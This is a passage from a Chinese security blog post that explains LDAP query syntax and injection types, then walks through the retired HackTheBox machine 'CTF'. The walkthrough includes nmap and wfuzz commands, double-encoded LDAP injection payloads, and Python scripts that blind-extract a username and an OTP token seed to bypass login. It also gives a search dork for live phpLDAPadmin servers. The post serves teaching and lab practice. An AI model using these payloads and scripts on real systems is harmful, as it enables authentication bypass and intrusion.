表明，只有每个参数都为真，才会将此筛选条件应用到要查询的对象。</p><p><strong>|（逻辑或）</strong></p><p>例如，如果希望查找属性<code>givenName</code>值为Jhon或者Jack的所有对象，可以使用<code>(|(givenName=Jhon)(givenName=Jack))</code>。</p><p><strong>!（逻辑非）</strong></p><p>例如，如果需要查找<code>givenName</code>为John的对象以外的所有对象。则应使用如下语句：<code>(!givenName=John)</code></p><p><strong>*（通配符）</strong></p><p>可使用通配符表示值可以等于任何值。使用它的情况可能是：您希望查找具有职务头衔的所有对象。为此，可以使用<code>(title=*)</code>，这会返回<code>title</code>属性包含内容的所有对象。</p><p>另一个例子是：您知道某个对象的<code>givenName</code>属性的开头两个字母是“Jo”。那么，可以使用<code>(givenName=Jo*)</code>进行查找，这会返回<code>givenName</code>以<code>Jo</code>开头的所有对象。</p><p>Over~~LDAP的语法是不是很简单。</p><p>说了这么多，可能很多小伙伴还是心存疑问，已经部署成功的LDAP到底是长什么样子？</p><p>我们可以通过Google Hacking <code>intitle:”phpLDAPadmin” inurl:cmd.php</code>来检索一下，真实的运行的LDAP服务的网站，这个地方我就贴一张图示范一下，包含了上面提到的所有概念。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200721151807.png" alt=""></p><h2 id="0x02-LDAP注入攻击面">0x02 LDAP注入攻击面</h2><p>其实它的攻击手法和SQL注入的原理非常相似，在有漏洞的环境中，这些查询参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。由于比较简单，我这里就走马观花的方式来过一遍LDAP注入的不同类型。</p><blockquote><p>以下部分内容摘自https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html</p></blockquote><h3 id="AND注入">AND注入</h3><p>这种情况，应用会构造由”&amp;”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(parameter1&#x3D;value1)(parameter2&#x3D;value2))</span><br></pre></td></tr></table></figure><p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p><p>比如说，为了验证客户端提供的user/password对，构造如下LDAP过滤器并发送给LDAP服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(USER&#x3D;Uname)(PASSWORD&#x3D;Pwd)) </span><br></pre></td></tr></table></figure><p>如果攻击者输入一个有效地用户名，如r00tgrok，然后再这个名字后面注入恰当的语句，password检查就会被绕过。</p><p>使得Uname=slisberger)(&amp;))，引入任何字符串作为Pwd值，构造如下查询并发送给服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(USER&#x3D; slisberger)(&amp;)(PASSWORD&#x3D;Pwd))</span><br></pre></td></tr></table></figure><h3 id="OR注入">OR注入</h3><p>这种情况，应用会构造由”|”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(|(parameter1&#x3D;value1)(parameter2&#x3D;value2))</span><br></pre></td></tr></table></figure><p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p><p>类似的，加入现在用于展示可用资源的查询为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(|(type&#x3D;Rsc1)(type&#x3D;Rsc2))</span><br></pre></td></tr></table></figure><p>Rsc1和Rsc2表示系统中不同种类的资源。如果攻击者输入<code>Rsc=printer)(uid=*)</code>，则下面的查询被发送给服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(|(type&#x3D;printer)(uid&#x3D;*))(type&#x3D;scanner)</span><br></pre></td></tr></table></figure><p>这样也会造成注入的产生。</p><h3 id="盲注">盲注</h3><p>SQL注入中有盲注，LDAP中也存在这种问题，包括下面介绍到的靶机用到的也是盲注的手法。</p><p>假设攻击者可以从服务器响应中推测出什么，尽管应用没有报出错信息，LDAP过滤器中注入的代码却生成了有效的响应或错误。攻击者可以利用这一行为向服务器问正确的或错误的问题。</p><p>还是用一个例子来说明。</p><p>假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;printer)(type&#x3D;Epson*))</span><br></pre></td></tr></table></figure><p>使用这个查询，如果有可用的Epson打印机，其图标就会显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void</span><br></pre></td></tr></table></figure><p>Web应用会构造如下查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*))(&amp;(objectClass&#x3D;void)(type&#x3D;Epson*))</span><br></pre></td></tr></table></figure><p><strong>仅第一个LDAP过滤器会被处理</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass&#x3D;*)(objectClass&#x3D;*))</span><br></pre></td></tr></table></figure><p>那么这样就和我们查询的初衷相违背了。</p><p>接下来就是这篇文章的重头戏了，我们主要从这个靶机中学到两点：</p><ul><li>怎么发现LDAP注入漏洞</li><li>如何利用LDAP注入漏洞</li></ul><h2 id="0x03-从HTB靶机中学习LDAP注入">0x03 从HTB靶机中学习LDAP注入</h2><h3 id="Initial-Enunciation">Initial Enunciation</h3><p>拿到靶机先用Nmap扫一下端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122</span><br><span class="line">Nmap scan report for ctf.htb (10.10.10.122)</span><br><span class="line">Host is up (1.8s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)</span><br><span class="line">|   256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)</span><br><span class="line">|_  256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.6 (CentOS) OpenSSL&#x2F;1.0.2k-fips mod_fcgid&#x2F;2.3.9 PHP&#x2F;5.4.16</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line"># Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds</span><br></pre></td></tr></table></figure><p>查看80端口</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710145257.png" alt=""></p><p>大概的意思就是让我们尝试去登录这个系统，但是不能用SQLmap或者Dirbuster去暴力猜解用户名和密码。</p><p>再去登录界面看一下：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710153946.png" alt=""></p><p>提示我们是一个OTP，即One Time Password，一般而言是1分钟更新一次。</p><p>查看源码，发现有一个Hint</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154051.png" alt=""></p><blockquote><p>如果比较熟悉LDAP的话，这里的两个名词schema和existing attribute已经提示了是关于LDAP注入。</p></blockquote><p>作者用一个已知的属性去存储了81位的token string，Google搜一下<code>token string (81 digits)</code>。</p><blockquote><p><a href="https://www.systutorials.com/docs/linux/man/1-stoken/">https://www.systutorials.com/docs/linux/man/1-stoken/</a></p></blockquote><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710154249.png" style="zoom: 67%;" /><p>可以看到一个关键的地方，<code>Pure numeric (81-digit) &quot;ctf&quot; (compressed token format) strings</code>，和靶机的题目相契合，现在就有一点思路了，应该要去找到这个81位纯数字的token，然后用stoken工具去生成OTP。那么主要是找到token，唯一可以利用的就是这个登录框了。</p><p>先随便用某个用户名和密码登录<code>admin:1234</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164835.png" alt=""></p><p>返回<code>User admin not found</code>，再用SQL注入的万能密码试一试</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710164644.png" alt=""></p><p>直接是没有任何显示，应该是对一些特殊字符有黑名单过滤。Fuzz一下过滤了一些什么字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w special-chars.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710165335.png" alt=""></p><blockquote><p>–hw 233 代表过滤掉形如<code>User xxx not found</code>的返回信息。</p></blockquote><p>我们发现<code>+</code>和<code>&amp;</code>返回的是232 Words，但是在页面测试一下</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710173607.png" alt=""></p><p>发现返回的还是<code>User + not found</code>或者<code>User &amp; not found</code>，这样的话应该是233 Words，而不是Wfuzz返回的232 Words。</p><p>我们尝试把这些特殊字符二次URL编码，看Web应用是否还能解析，用seclists中的doble_uri_hex.txt作为字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;1234&#39; -w doble-uri-hex.txt 10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710193655.png" alt=""></p><p>最后Fuzz出来的被过滤的字符就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%2500 ---&gt; %00</span><br><span class="line">%2528 ---&gt; (</span><br><span class="line">%2529 ---&gt; )</span><br><span class="line">%252a ---&gt; *</span><br><span class="line">%255c ---&gt; \</span><br></pre></td></tr></table></figure><p>这些被过滤的字符就是LDAP注入需要过滤的所有字符，再结合<code>login.php</code>页面源代码中的hint，可以确定是LDAP注入。</p><h3 id="Getting-User-Access">Getting User Access</h3><p>先来看LDAP注入的最基本形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">(password&#x3D;1234)</span><br><span class="line">(uid&#x3D;ca01h%00)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>具体到这个靶机的话，我们需要猜解括号的个数。运用类似盲注的思想，如果注入成功，那么就会返回<code>User ca01h not found</code>。</p><p>假设只有一个括号：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202659.png" alt=""></p><p>假设有两个括号：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710202740.png" alt=""></p><p>假设有三个括号：</p><p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200710202913036.png" alt="image-20200710202913036"></p><p>当尝试到三个括号用于闭合时，成功返回了<code>User ca01h%29%29%29%00 not found</code>，那么这个登录框的LDAP查询的基本形式就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">(&amp;</span><br><span class="line">(password&#x3D;1234)</span><br><span class="line">(uid&#x3D;ca01h)))%00</span><br><span class="line">)</span><br><span class="line">(&amp;|</span><br><span class="line">(other comparing)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>接着，我们再回头去看一下Fuzz出来的被过滤的字符，其中<code>%25%2a</code>返回的消息长度为231 Words</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710203938.png" alt=""></p><p>发现回显的消息是<code>Cannot login</code>，说明可以用<code>*</code>通配符来盲注用户名，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">### username_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://10.10.10.122/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">username, done = <span class="string">&#x27;&#x27;</span>, <span class="literal">False</span></span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> done:</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ascii_lowercase:</span><br><span class="line">payload = username + c + quote_plus(<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;inputUsername&#x27;</span>: payload,</span><br><span class="line"><span class="string">&#x27;inputOTP&#x27;</span>: <span class="string">&#x27;1234&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(URL, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Cannot login&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">username += c</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        sys.stdout.write(<span class="string">f&#x27;\r<span class="subst">&#123;username&#125;</span><span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        done = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;[+] Username: <span class="subst">&#123;username&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710210916.png" alt=""></p><p>用户名为<code>ldapuser</code></p><p>知道了用户名之后，我们就要去获取生成OTP的81位token，通过页面源代码的提示，这个token存储在某一个LDAP默认已经存在的属性当中。而默认的属性可以在<a href="https://www.youtube.com/watch?v=51JQg202csw">PayloadsAllTheThings</a>中找到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">c</span><br><span class="line">cn</span><br><span class="line">co</span><br><span class="line">commonName</span><br><span class="line">dc</span><br><span class="line">facsimileTelephoneNumber</span><br><span class="line">givenName</span><br><span class="line">gn</span><br><span class="line">homePhone</span><br><span class="line">id</span><br><span class="line">jpegPhoto</span><br><span class="line">l</span><br><span class="line">mail</span><br><span class="line">mobile</span><br><span class="line">name</span><br><span class="line">o</span><br><span class="line">objectClass</span><br><span class="line">ou</span><br><span class="line">owner</span><br><span class="line">pager</span><br><span class="line">password</span><br><span class="line">sn</span><br><span class="line">st</span><br><span class="line">surname</span><br><span class="line">uid</span><br><span class="line">username</span><br><span class="line">userPassword</span><br></pre></td></tr></table></figure><p>如果不想写脚本的话用wfuzz来Fuzz靶机的LDAP中存在的属性可能会更快一些，但还是要先找到注入的形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">(&amp;</span><br><span class="line">(password&#x3D;1234)</span><br><span class="line">(uid&#x3D;ldapuser)</span><br><span class="line">(FUZZ&#x3D;*)</span><br><span class="line">)</span><br><span class="line">(&amp;|</span><br><span class="line">(other comparing)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>此外还要把注入的字符<code>ldapuser)(FUZZ=*</code>进行二次URL编码，编码之后的结果<code>ldapuser%2529%2528FUZZ%253d%252a</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c --hw 233 -d &#39;inputUsername&#x3D;ldapuser%2529%2528FUZZ%253d%252a&amp;inputOTP&#x3D;1234&#39; -w LDAP_attributes.txt http:&#x2F;&#x2F;10.10.10.122&#x2F;login.php</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710213532.png" alt=""></p><p>我们Fuzz出来了这么些属性是存在于靶机的LDAP服务中的，现在的工作就是一个一个的属性来猜解，属于一些重复性的工作，就不在这里过多赘述了，最后可以找到token是存储于pager属性中。接着写脚本用来burp81位token</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># pager_burp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://10.10.10.122/login.php&quot;</span></span><br><span class="line">attribute = <span class="string">&quot;pager&quot;</span></span><br><span class="line">loop = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> loop &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> digits:</span><br><span class="line">        token = token</span><br><span class="line">        <span class="comment"># ldapuser)(pager=&lt;token&gt;)*</span></span><br><span class="line">        payload = <span class="string">f&quot;ldapuser%29%28<span class="subst">&#123;attribute&#125;</span>%3d<span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>%2a&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;inputUsername&quot;</span>: payload, <span class="string">&quot;inputOTP&quot;</span>: <span class="string">&quot;1234&quot;</span>&#125;</span><br><span class="line">        r = requests.post(URL, data=data)</span><br><span class="line">        sys.stdout.write(<span class="string">f&quot;\rToken: <span class="subst">&#123;token&#125;</span><span class="subst">&#123;digit&#125;</span>&quot;</span>)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Cannot login&quot;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            token += digit</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> digit == <span class="string">&quot;9&quot;</span>:</span><br><span class="line">            loop = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">f&#x27;[+] Token: <span class="subst">&#123;token&#125;</span> \n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710220938.png" alt=""></p><p>这里值得注意的是需要删掉最后的一个9，所以最后的token就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">285449490011357156531651545652335570713167411445727140604172141456711102716717000</span><br></pre></td></tr></table></figure><p>接着用stoken工具导入token</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710221459.png" alt=""></p><p>生成OTP</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230111.png" alt=""></p><p>成功登录后，跳转到<code>page.php</code>页面，可以执行命令</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710230246.png" alt=""></p><p>Damn it…提示我们<code>ldapuser</code>权限不够不能执行命令，这里有两种办法：</p><ul><li><p>对<code>group</code>属性进行注入，即把后面group属性的filter截断</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(&amp;</span><br><span class="line">(&amp;</span><br><span class="line">(pager&#x3D;&lt;token&gt;)</span><br><span class="line">(uid&#x3D;ldapuser)))%00</span><br><span class="line">)</span><br><span class="line">(|</span><br><span class="line">(group&#x3D;root)</span><br><span class="line">(group&#x3D;adm)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></li><li><p>使用<code>*</code>通配符作为用户名登录</p></li></ul><p>这里演示一下第一种方案，payload直接放到burp中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapuser%2529%2529%2529%2500</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233124.png" alt=""></p><p>再去执行ls命令</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710233303.png" alt=""></p><p>读取page.php文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234438.png" alt=""></p><p>SSH登录：<code>fdapuser:e398e27d5c4ad45086fe431120932a01</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200710234624.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;文章首发于 安全客&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;从HTB靶机中浅谈LDAP注入攻击&quot;&gt;从HTB靶机中浅谈LDAP注入攻击&lt;/h1&gt;
&lt;p&gt;最近在HackTheBox上氪了金（肉疼😭），做了一些已经retired的高质量靶机
      
    
    </summary>
    
    
      <category term="Web安全" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/Web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="Web安全学习" scheme="http://ca0y1h.top/tags/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="LDAP" scheme="http://ca0y1h.top/tags/LDAP/"/>
    
  </entry>
  
</feed>
